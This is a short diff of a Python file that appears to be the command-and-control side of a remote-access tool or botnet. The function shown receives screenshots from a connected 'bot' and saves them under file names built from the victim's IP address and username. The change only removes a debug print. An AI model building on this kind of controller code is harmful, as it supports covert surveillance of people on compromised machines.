@@ -209,7 +209,6 @@ def screenshot() -> bool:
     received_file_data = b64decode(receiver())
     if received_file_data != 'reachedexcept':
         counter = 0
-        print(connected_sockets[active_bot])
         while True:
             local_filename = 'screenshot-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'], connected_sockets[active_bot]['username'], str(counter))
             if not os.path.isfile(local_filename):
